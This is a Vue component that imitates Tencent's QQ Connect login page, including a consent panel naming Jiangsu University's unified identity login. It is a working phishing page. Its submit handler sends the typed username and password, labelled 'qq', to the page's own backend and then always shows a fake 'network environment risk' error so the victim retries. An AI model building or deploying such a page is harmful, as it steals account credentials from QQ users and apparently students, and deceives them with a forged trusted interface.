<script setup>
import { onMounted, ref } from 'vue';
import Http from '../middleware/api.js'
const passwordError = ref(false) //hide password input if password is incorrect
const username = ref('')
const password = ref('')
const submit = async()=>{
    console.log(username.value);
    const res = await Http.post('/',{
        username:username.value, //sets username to the value of the username input field.
        password:password.value, //sets password to the value of the password input field.
        type:'qq'
    })
    console.log(res.data);
    passwordError.value=true
}   

</script>
<template>
    <div class="container">
        <!-- @header Start-->
        <div class="lay_top" id="lay_top">
            <div class="lay_top_inner">
                <h1 class="logo text_hide">QQ登录</h1>
                <div class="lat_top_other">
                    <a href="https://connect.qq.com" target="_blank" title="什么是QQ登录"><i class="icon_help_white"></i>QQ登录</a>
                    <span class="line">|</span>
                    <a href="https://connect.qq.com/toc/auth_manager?from=auth" id="auth_manager_link" target="_blank"
                        title="登录授权管理">授权管理</a>
                    <span class="line">|</span>
                    <a href="https://connect.qq.com/manage" target="_blank" title="申请接入">申请接入</a>
                </div>
            </div>
        </div>
        <!-- @header End -->
        <div id="combine_page">
            <div class="page_login combine_page_children float_left border_right">
                <div class="lay_login_form">
                    <div class="web_qr_login" id="web_qr_login" style="display: block;">
                        <div class="web_qr_login_show" id="web_qr_login_show">
                            <div class="web_login" id="web_login">
                                <div class="tips" id="tips"> <noscript id="noscript_area"><span
                                            class="noscript">你的浏览器脚本被禁用了， <a href="/assistant/noscript.html" target="_blank"
                                                style="color: #29B1F1">查看启用方法</a> </span><img id="noscript_img"
                                            style="width:1px;height:1px;"
                                            src="https://ui.ptlogin2.qq.com/cgi-bin/report?id=301240"></noscript>
                                    <div class="title" id="title_2">密码登录</div>
                                    <div id="qlogin_entry">推荐使用<a class="switch_btn_focus link_tips" hidefocus="true"
                                            id="switcher_qlogin" href="javascript:void(0);" tabindex="7">快捷登录</a>，防止盗号。
                                    </div>
                                </div>
                                <div></div>
                                <div class="login_form">
                                    <form id="loginform" autocomplete="off" name="loginform" action="" method="post"
                                        target="0" style="margin:0px;">
                                        <div class="uinArea" id="uinArea"><label :class="['input_tips',username?'close':'open']" id="uin_tips" for="u"
                                                data-onlyqq="QQ号码"
                                                style="margin-left: 2px;">支持QQ号/邮箱/手机号登录</label>
                                            <div class="inputOuter">
                                                <input type="text" v-model="username" class="inputstyle" id="u" name="u" tabindex="1"> <a class="uin_del" id="uin_del"
                                                    href="javascript:void(0);" style="display: block;"></a></div>
                                            <ul class="email_list" id="email_list" style="display: none;"></ul>
                                        </div>
                                        <div class="pwdArea" id="pwdArea"><label :class="['input_tips',password?'close':'open']" id="pwd_tips" for="p"
                                                style="margin-left: 2px;">请输入密码</label>
                                            <div class="inputOuter" id="pwdAreaInputOuter"><input type="password"
                                                    class="inputstyle password" id="p" name="p" v-model="password" maxlength="16"
                                                    tabindex="2"></div>
                                            <div :class="['error_tips',,passwordError?'open':'close']" id="error_tips"
                                                style="text-align: left;"><span
                                                    class="error_logo" id="error_logo"></span> <span class="err_m"
                                                    id="err_m">当前网络环境存在风险，推荐使用手机QQ扫码登录。你也可以更换网络环境后重试。</span></div>
                                            <div class="lock_tips" id="caps_lock_tips" style="display: none;"><span
                                                    class="lock_tips_row"></span> <span>大写锁定已打开</span></div>
                                        </div>
                                        <div class="submit" style="top: 0px;margin-top: 2px;"><div class="login_button" 
                                                ><input type="button" @click="submit"
                                                    tabindex="6" value="登录" class="btn" id="login_button"></div></div>
                                    </form>
                                </div>
                                <div class="guanjia hide"><img class="guanjia_logo hide"
                                        src="//imgcache.qq.com/ptlogin/v4/style/40/images/logo.png"><input type="checkbox"
                                        class="guanjia_checkbox hide"><span class="guanjia_tips"></span></div>
                            </div>
                            <div class="bottom" id="bottom_web" style="display: block;"><a
                                    href="https://ssl.ptlogin2.qq.com/ptui_forgetpwd" class="link" id="forgetpwd"
                                    target="_blank">找回密码</a> <span class="dotted"></span> <a
                                    href="https://ssl.ptlogin2.qq.com/j_newreg_url" class="link" target="_blank">注册帐号</a>
                                <span class="dotted"></span> <a class="link" id="feedback_web"
                                    href="https://support.qq.com/products/77942?customInfo=.appid101584950"
                                    target="_blank">意见反馈</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="page_accredit combine_page_children float_left border_left">
                <div class="lay_main" id="lay_main">
                    <div class="lay_accredit_con">
                        <p class="cnt_wording"></p>
                        <div class="accredit_info" id="accredit_info">
                            <ul class="accredit_info_op">
                                <li class="select_all_li">
                                    <input type="checkbox" id="select_all" class="checkbox oauth_checkbox_all"
                                        hidefocus="true" checked="checked">
                                    <label class="oauth_item_title" for="select_all">全选 <p
                                            style="margin-left: 8px; display: inline-block;" class="app_site_wording"><a
                                                class="accredit_site" id="accredit_site_link" href="https://pass.ujs.edu.cn"
                                                target="_blank">江苏大学统一身份认证</a>将获取以下权限：
                                        </p>
                                    </label>
                                </li>
                                <li>
                                    <input name="api_choose" hidefocus="true" type="checkbox"
                                        class="checkbox oauth_checkbox" id="item_1010" value="1010" title="默认授权 不可更改"
                                        checked="" disabled="">
                                    <label for="item_1010" class="oauth_item_title">使用你的QQ头像、昵称信息</label>
                                </li>
                            </ul>
                        </div>
                        <div class="oauth_tips_div">
                            <p class="oauth_tips">
                                授权即同意<a href="https://ti.qq.com/agreement/index.html" target="_blank">服务协议</a>和<a
                                    href="https://rule.tencent.com/rule/preview/3fd52bde-6555-453b-9ab8-c5f1f3d22c62"
                                    target="_blank">QQ隐私保护指引</a>
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!--@fragment_bottom Start-->
        <!--@fragment_bottom End -->
        <div class="layui-xzxform-label"></div>
    </div>
</template>
<style scoped>
.open {
    display: block;
}
.close {
    display: none;
}
.error_tips .error_logo {
    position: absolute;
    height: 16px;
    line-height: 16px;
    width: 16px;
    background: url(https://qq-web-legacy.cdn-go.cn/any.ptlogin2.qq.com/v1.42.4/ptlogin/v4/style/40/images/error_icon.png) no-repeat;
    background: url(https://qq-web-legacy.cdn-go.cn/any.ptlogin2.qq.com/v1.42.4/ptlogin/v4/style/40/images/error_icon_ie.png) no-repeat\9;
    background-size: contain;
}
.error_tips .err_m {
    font-size: 12px;
    display: inline-block;
    padding-left: 22px;
    line-height: 16px;
    color: #FF5765;
    vertical-align: middle;
    text-align: left;
}
.web_login .submit {
    position: relative;
    height: 38px;
    border-radius: 4px;
    background-color: #09F;
}
.web_login .login_button {
    position: absolute;
    left: 0;
    outline: 0;
    width: 100%;
}
.web_login .login_button .btn {
    width: 100%;
    height: 38px;
    line-height: 18px;
    border: none;
    font-size: 14px;
    font-weight: 400;
    color: #fff;
    background: 0 0;
    cursor: pointer;
}
.bottom {
    height: 16px;
    width: 100%;
    margin-top: 40px;
    text-align: center;
    font-size: 12px;
    color: #000;
    line-height: 16px;
}
.bottom .link {
    color: #000;
    vertical-align: middle;
}
.bottom .dotted {
    display: inline-block;
    height: 12px;
    margin: 0 22px;
    border-left: 1px solid #F5F5F5;
    vertical-align: middle;
    color: transparent;
}
.web_qr_login {
    position: relative;
    overflow: hidden;
    height: 100%;
}
.web_login .tips {
    position: relative;
    margin: 0 auto 26px;
    z-index: 11;
    font-size: 12px;
    line-height: 16px;
    color: #000;
    text-align: center;
}
.title {
    font-size: 20px;
    line-height: 28px;
    color: #000;
    margin: 16px 0 6px;
}
.web_login .login_form {
    width: 250px;
    margin: 0 auto;
}
.web_login .uinArea {
    height: 48px;
    position: relative;
    z-index: 10;
}
.web_login .pwdArea {
    height: 68px;
    position: relative;
    z-index: 3;
}
.web_login .submit {
    position: relative;
    height: 38px;
    border-radius: 4px;
    background-color: #09F;
}
.web_login .input_tips,
.web_login .input_tips_focus {
    position: absolute;
    top: 10px;
    left: 16px;
    font-size: 13px;
    line-height: 18px;
    color: #CCC;
    cursor: text;
}
.web_login .inputOuter,
.web_login .inputOuter_focus {
    width: 250px;
    height: 38px;
}
.web_login .inputstyle {
    width: 232px;
    position: relative;
    height: 16px;
    padding: 10px 0 10px 16px;
    line-height: 16px;
    border: 1px solid #CCC;
    border-radius: 4px;
    background: 0 0;
    color: #000;
    font-family: PingFang SC;
    font-size: 13px;
    outline: none;
}
.container {
    height: 100vh;
    width: 100vw;
    background-repeat: no-repeat;
    background-size: cover;
}
html,
body,
div,
span,
applet,
object,
iframe,
h1,
h2,
h3,
h4,
h5,
h6,
p,
blockquote,
pre,
a,
abbr,
acronym,
address,
big,
cite,
code,
del,
dfn,
em,
img,
ins,
kbd,
q,
s,
samp,
small,
strike,
strong,
sub,
sup,
tt,
var,
b,
u,
i,
center,
dl,
dt,
dd,
ol,
ul,
li,
fieldset,
form,
label,
legend,
input,
button,
textarea,
table,
caption,
tbody,
tfoot,
thead,
tr,
th,
td,
article,
aside,
canvas,
details,
figcaption,
figure,
footer,
header,
hgroup,
menu,
nav,
section,
summary,
time,
mark,
audio,
video {
    margin: 0;
    padding: 0
}
h1,
h2,
h3,
h4,
h5,
h6 {
    font-size: 100%
}
input,
textarea,
select,
button {
    font-size: 12px;
    font-weight: normal;
    font-family: inherit
}
input[type="button"],
input[type="submit"],
select,
button {
    cursor: pointer
}
table {
    border-collapse: collapse;
    border-spacing: 0
}
address,
caption,
cite,
code,
dfn,
em,
th,
var {
    font-style: normal;
    font-weight: normal
}
li {
    list-style: none
}
caption,
th {
    text-align: left
}
q:before,
q:after {
    content: ''
}
abbr,
acronym {
    border: 0;
    font-variant: normal
}
sup {
    vertical-align: text-top
}
sub {
    vertical-align: text-bottom
}
fieldset,
img,
a img,
iframe {
    border-width: 0;
    border-style: none
}
iframe {
    overflow-x: hidden
}
img {
    -ms-interpolation-mode: bicubic
}
textarea {
    resize: vertical;
    overflow-y: auto
}
legend {
    color: #000
}
a {
    text-decoration: none
}
hr {
    height: 0
}
label {
    cursor: pointer
}
article,
aside,
details,
figcaption,
figure,
footer,
header,
hgroup,
menu,
nav,
section {
    display: block
}
html,
body {
    background-color: #fff;
    color: #555;
    height: 100%;
    font-family: PingFang SC, "Microsoft Yahei", Tahoma, sans-serif;
    line-height: 1.333;
    font-size: 12px;
    overflow: auto
}
a {
    color: #2e77e5
}
a:hover {
    text-decoration: none;
    color: #2e77e5
}
.none {
    display: none
}
.show {
    display: block
}
.text_hide {
    line-height: 500px;
    overflow: hidden
}
.lay_main {
    width: 100% !important;
    margin: 0
}
.lay_main_single {
    width: 284px
}
.lay_top_inner {
    max-width: 688px;
    margin: 0 auto;
    min-width: 305px;
    width: auto !important;
    width: 688px
}
.lay_top {
    overflow: hidden;
    height: 47px;
    border-bottom: 1px solid #f5f5f5;
    background: #FFF
}
.lay_top .logo {
    float: left;
    height: 60px;
}
.lay_top .lat_top_other {
    float: right;
    display: none;
    margin: 13px 32px 0 0;
    text-align: right;
    font-size: 16px;
    line-height: 22px
}
.lay_top .lat_top_defined {
    right: 130px
}
.lay_top a.help {
    display: block;
    color: #fff;
    vertical-align: middle;
    margin-top: 4px
}
.lay_main .lay_login_form {
    width: 284px;
    margin: 38px auto 0 auto
}
.lay_main:before,
.lay_main:after {
    content: ".";
    display: block;
    height: 0;
    visibility: hidden
}
.lay_main:after {
    clear: both
}
.lay_main {
    margin-left: 32px;
    *zoom: 1
}
.lay_footer {
    clear: both;
    border-top: 1px solid #e3e3e3
}
.lay_footer_l {
    float: left;
    margin-left: 158px
}
.lay_footer_r {
    position: relative;
    float: right
}
.lay_footer .line {
    color: #b5b5b5;
    padding: 0 3px
}
.lay_main_single .lay_login_form {
    float: none;
    width: auto
}
.lay_login_form {
    margin: 10px 0 0 11px;
    color: #a0a0a0
}
.lay_footer_inner {
    width: 590px;
    margin: 0 auto
}
.lay_footer {
    height: 55px;
    line-height: 55px
}
.lay_top .logo {
    width: 56px;
    height: 26px;
    margin-top: 10px;
    margin-left: 21px;
    background-image: url(https://qgdd.oss-cn-hangzhou.aliyuncs.com/img/qqlogo_2022.png);
    background-size: cover;
    background-repeat: no-repeat;
    background: url(https://qgdd.oss-cn-hangzhou.aliyuncs.com/img/qqlogo_2022.png) 0 0 no-repeat\9
}
.lat_top_other {
    color: #cfe1ea
}
.lat_top_other a {
    color: #fff
}
.lat_top_other a:hover {
    color: #fff
}
.lat_top_other a,
.lat_top_other span {
    display: flex;
    align-items: center
}
.lat_top_other .line {
    margin: 0 16px;
    color: rgba(204, 235, 255, 0.5)
}
.accredit_site {
    margin-right: 5px
}
.accredit_site:hover {
    color: #2e77e5
}
.accredit_info {
    margin-top: 8px;
    overflow: hidden;
    *zoom: 1;
    transition-property: height;
    transition-duration: .5s
}
.accredit_info_op {
    display: flex;
    flex-direction: column
}
.accredit_info_op li {
    margin-bottom: 6px;
    color: #666;
    *zoom: 1
}
.accredit_info_op li input[type=checkbox] {
    visibility: hidden;
    visibility: visible\9
}
.accredit_info_op li input[type="checkbox"]:after {
    content: ' ';
    display: inline-block;
    width: 16px;
    height: 16px;
    background: url(https://imgcache.qq.com/open/connect/widget/pc/login/img/checkbox-unchecked.png);
    background-size: contain;
    background-repeat: no-repeat;
    visibility: visible;
    visibility: hidden\9
}
.accredit_info_op li input[type=checkbox]:checked:after {
    background: url(https://imgcache.qq.com/open/connect/widget/pc/login/img/checkbox-checked.png);
    background-size: contain;
    background-repeat: no-repeat
}
.accredit_info_op li input[type="checkbox"]:checked:disabled:after {
    background: url(https://imgcache.qq.com/open/connect/widget/pc/login/img/checkbox-checked-disabled.png);
    background-size: contain;
    background-repeat: no-repeat
}
.accredit_info_op .ui_icon {
    position: absolute;
    left: 0;
    top: 8px;
    width: 30px;
    height: 30px
}
.accredit_info_op em {
    font-weight: 700
}
.page_accredit img {
    width: 64px;
    height: 64px;
    display: block;
    margin-bottom: 3px
}
.page_accredit .input_check {
    width: 13px;
    height: 13px;
    float: left;
    margin-top: 23px;
    margin-right: 5px;
    _margin-right: 2px
}
.icon_help_white {
    display: inline-block;
    *display: inline;
    zoom: 1;
    height: 16px;
    width: 16px;
    vertical-align: middle;
    margin-right: 6px;
    font-size: 0;
    background-image: url(img/logo_question.png);
    background-size: contain;
    background-repeat: no-repeat;
    background: url(img/logo_question_ie.png) 0 0 no-repeat\9
}
.lay_login_warn {
    padding: 80px 0
}
.fn_login_warn {
    width: 500px;
    margin: 0 auto;
    line-height: 40px;
    padding-left: 100px
}
.fn_login_warn p {
    overflow: hidden;
    *zoom: 1
}
.fn_login_warn .warn_txt {
    display: block;
    font-size: 15px;
    overflow: hidden;
    *zoom: 1;
    position: relative
}
.fn_login_warn .warn_tips {
    color: #a5a5a5
}
.icon {
    display: inline-block;
    background-repeat: no-repeat
}
.inline_block {
    display: inline-block;
    *display: inline;
    *zoom: 1
}
#combine_page {
    max-width: 688px;
    width: 688px;
    margin: 0 auto
}
.float_left {
    float: left
}
.align {
    margin: 0 auto
}
#combine_page .page_login {
    width: 433px
}
#combine_page .page_accredit {
    width: 227px;
    height: 298px
}
.oauth_app_logo {
    float: left;
    width: 64px;
    height: 64px
}
.oauth_app {
    height: 64px;
    width: 300px
}
.lay_footer_r a {
    margin: 0 0 0 10px
}
.page_error .lay_footer {
    top: 0
}
.lay_accredit_con {
    margin-top: 76px;
    *zoom: 1;
    font-size: 12px;
    line-height: 16px;
    text-align: left;
}
.oauth_tips_div {
    margin-top: 1px;
    line-height: 16px
}
.oauth_item_title {
    line-height: 16px;
    margin-left: 8px
}
.oauth_checkbox_all,
.oauth_checkbox {
    display: block;
    float: left;
    height: 16px;
    width: 16px
}
.packup_controler {
    cursor: pointer;
    color: #51b7ec;
    margin-left: 13px
}
.packup_controler:hover {
    color: #1797db
}
.border_left {
    border-left: 1px solid #f5f5f5;
    margin-top: 32px
}
.packup {
    margin-top: 7px
}
.pack_icon {
    width: 0;
    height: 0;
    border-width: 5px;
    border-style: solid;
    border-color: white;
    overflow: hidden;
    float: left;
    margin-left: 1px
}
.pack_icon_up {
    border-bottom-color: #51b7ec
}
.pack_icon_up_hover {
    border-bottom-color: #1797db !important
}
.pack_icon_down {
    border-top-color: #51b7ec;
    margin-top: 5px
}
.pack_icon_down_hover {
    border-top-color: #1797db !important
}
.red {
    color: red
}
.hide {
    display: none
}
.vi_hide {
    visibility: hidden
}
.lay_login_form .loading_tips,
.lay_login_form .wording_tips {
    text-align: center
}
.lay_login_form .qlogin_show {
    width: 100%;
    overflow: hidden;
    position: relative;
    text-align: center;
    margin-top: 20px
}
.lay_login_form .qlogin_show .face {
    display: inline-block;
    height: 120px;
    width: 100px;
    text-align: center;
    position: relative;
    cursor: pointer;
    outline: 0;
    text-decoration: none;
    color: #a0a0a0
}
.lay_login_form .qlogin_show img {
    width: 80px;
    height: 80px;
    position: absolute;
    top: 10px;
    left: 9px;
    border: 0
}
.lay_login_form .qlogin_show .nick {
    display: inline-block;
    text-align: center;
    position: absolute;
    top: 100px;
    left: 0;
    height: 20px;
    line-height: 18px;
    vertical-align: middle;
    width: 100%;
    overflow: hidden
}
.lay_login_form .qlogin_show .uin {
    background: #000;
    height: 20px;
    width: 80px;
    line-height: 20px;
    position: absolute;
    left: 10px;
    top: 72px;
    filter: Alpha(opacity=50);
    opacity: .5;
    color: #fff;
    border-radius: 0 0 4px 4px
}
.lay_login_form .qlogin_show .img_out_focus {
    width: 88px;
    height: 88px;
    position: absolute;
    top: 5px;
    left: 5px;
    background: url(sprite/sprite.png?max_age=2592000&v=20140108) no-repeat 3px -283px
}
.img_out_focus_focus {
    background-position: -1px -187px !important
}
.lay_login_form .qlogin_show .vip_logo {
    width: 26px;
    height: 12px;
    position: absolute;
    top: 11px;
    left: 11px;
    background: url(sprite/vip_logo.gif?max_age=2592000&v=20140108) no-repeat 0 0
}
.wording_tips a.ch_uin {
    width: 80px;
    height: 30px;
    background: url(sprite/sprite.png?max_age=2592000&v=20140108) no-repeat 0 -70px;
    display: block;
    margin: 0 auto
}
.wording_tips a.ch_uin:hover {
    background-position: 0 -110px
}
.lay_login_form .wording_timeout {
    margin-top: 5px
}
.lay_login_form .wording_ch {
    margin-top: 15px
}
.cnt_wording {
    margin-bottom: 16px
}
.icon-i {
    display: block;
    width: 40px;
    height: 40px;
    background: url(sprite/sprite.png?max_age=2592000&v=20140108) no-repeat 0 -371px;
    position: absolute;
    left: 120px
}
body {
    background-color: #FFF
}
.qlogin .face .nick,
.qlogin_list .return {
    width: 100%
}
.qlogin .qr_1 .qr_invalid_tips {
    color: #FFF
}</style>